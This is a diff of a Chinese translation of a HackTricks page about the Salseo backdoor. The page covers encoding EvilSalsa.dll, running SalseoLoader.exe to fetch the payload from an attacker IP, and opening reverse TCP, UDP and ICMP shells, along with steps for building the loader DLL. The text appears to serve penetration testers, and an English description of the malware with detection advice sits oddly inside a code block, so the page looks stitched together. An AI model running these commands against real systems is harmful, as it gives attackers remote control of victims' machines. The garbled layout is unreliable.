@@ -4,10 +4,10 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 * 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
 * 获取[**官方PEASS和HackTricks的衣物**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
@@ -30,7 +30,7 @@
 
 ## 准备后门
 
-首先，你需要对**EvilSalsa.dll**进行编码。你可以使用python脚本**encrypterassembly.py**或者编译项目**EncrypterAssembly**：
+首先，你需要对**EvilSalsa.dll**进行编码。你可以使用python脚本**encrypterassembly.py**或者编译项目**EncrypterAssembly**来进行编码：
 
 ### **Python**
 ```
@@ -57,35 +57,35 @@ The backdoor is capable of performing various malicious activities, including:
 
 4. **File Manipulation**: The backdoor can create, modify, or delete files on the compromised system, giving the attacker the ability to plant additional malware or tamper with existing files.
 
-5. **System Surveillance**: Salseo can gather system information, such as installed software, hardware details, and network configurations, providing the attacker with valuable insights for further exploitation.
+5. **System Surveillance**: Salseo can gather information about the infected system, such as hardware specifications, installed software, and network configurations. This information can be used to identify potential vulnerabilities or gather intelligence for future attacks.
 
 ##### Infection Vectors
 
 The Salseo backdoor can be delivered through various infection vectors, including:
 
-1. **Phishing Emails**: Malicious attachments or links in phishing emails can lead to the installation of the backdoor when clicked or opened.
+1. **Email Attachments**: Malicious email attachments, such as infected documents or executables, can be used to deliver the backdoor to unsuspecting users.
 
-2. **Drive-by Downloads**: Visiting compromised or malicious websites can trigger the automatic download and execution of the backdoor without the user's knowledge.
+2. **Drive-by Downloads**: Visiting compromised or malicious websites can result in the automatic download and execution of the Salseo backdoor.
 
-3. **Exploit Kits**: Salseo can be delivered through exploit kits that target vulnerabilities in outdated software or plugins.
+3. **Exploiting Vulnerabilities**: The backdoor can exploit known vulnerabilities in software or operating systems to gain unauthorized access to a system.
 
-4. **Malicious Downloads**: Users may unknowingly download and execute the backdoor when accessing pirated software, cracked games, or other illegitimate sources.
+4. **Social Engineering**: Attackers may use social engineering techniques, such as phishing emails or fake software updates, to trick users into downloading and executing the backdoor.
 
 ##### Detection and Prevention
 
 Detecting and preventing the Salseo backdoor requires a multi-layered approach, including:
 
-1. **Antivirus Software**: Regularly update and use reputable antivirus software to detect and remove known malware signatures.
+1. **Antivirus Software**: Regularly update and use reputable antivirus software to detect and remove known malware, including the Salseo backdoor.
 
-2. **Patch Management**: Keep operating systems, software, and plugins up to date to mitigate vulnerabilities that could be exploited by the backdoor.
+2. **Patch Management**: Keep software and operating systems up to date with the latest security patches to minimize the risk of exploitation.
 
-3. **User Education**: Train users to recognize and avoid phishing emails, suspicious websites, and unauthorized downloads.
+3. **User Education**: Train users to recognize and avoid common social engineering techniques, such as phishing emails or suspicious downloads.
 
-4. **Network Monitoring**: Implement network monitoring tools to detect unusual traffic patterns or connections to known malicious C2 servers.
+4. **Network Monitoring**: Implement network monitoring tools to detect unusual or suspicious network traffic that may indicate the presence of the backdoor.
 
-5. **Firewall Configuration**: Configure firewalls to block unauthorized inbound and outbound connections, limiting the backdoor's ability to communicate with the C2 server.
+5. **Firewall Configuration**: Configure firewalls to restrict unauthorized inbound and outbound network connections, limiting the backdoor's ability to communicate with the remote C2 server.
 
-By implementing these preventive measures and maintaining a proactive security posture, organizations can reduce the risk of falling victim to the Salseo backdoor and other similar malware.
+By implementing these measures, organizations can enhance their security posture and reduce the risk of falling victim to the Salseo backdoor.
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -108,9 +108,9 @@ SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Att
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
-### **获取ICMP反向shell（已在受害者内部编码的dll）**
+### **获取一个ICMP反向shell（已经在受害者内部编码的dll）**
 
-**这次你需要在客户端上使用一个特殊工具来接收反向shell。下载：** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
+**这次你需要在客户端上使用一个特殊的工具来接收反向shell。下载：** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
 #### **禁用ICMP回复：**
 ```
@@ -147,7 +147,7 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 ### 在主函数之前添加：\[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### 为该项目安装DllExport
 
@@ -161,7 +161,7 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 在项目文件夹中会出现以下文件：**DllExport.bat**和**DllExport\_Configure.bat**
 
-### **卸载** DllExport
+### **卸载DllExport**
 
 点击**卸载**（是的，很奇怪，但相信我，这是必要的）
 
@@ -185,11 +185,11 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 ### 构建解决方案
 
-选择**输出类型 = 类库**（项目 --> SalseoLoader属性 --> 应用程序 --> 输出类型 = 类库）
+选择**输出类型=类库**（项目 --> SalseoLoader属性 --> 应用程序 --> 输出类型=类库）
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-选择**x64平台**（项目 --> SalseoLoader属性 --> 构建 --> 平台目标 = x64）
+选择**x64平台**（项目 --> SalseoLoader属性 --> 构建 --> 平台目标=x64）
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
@@ -239,10 +239,10 @@ rundll32.exe SalseoLoader.dll,main
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 * 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
 * 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**推特**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
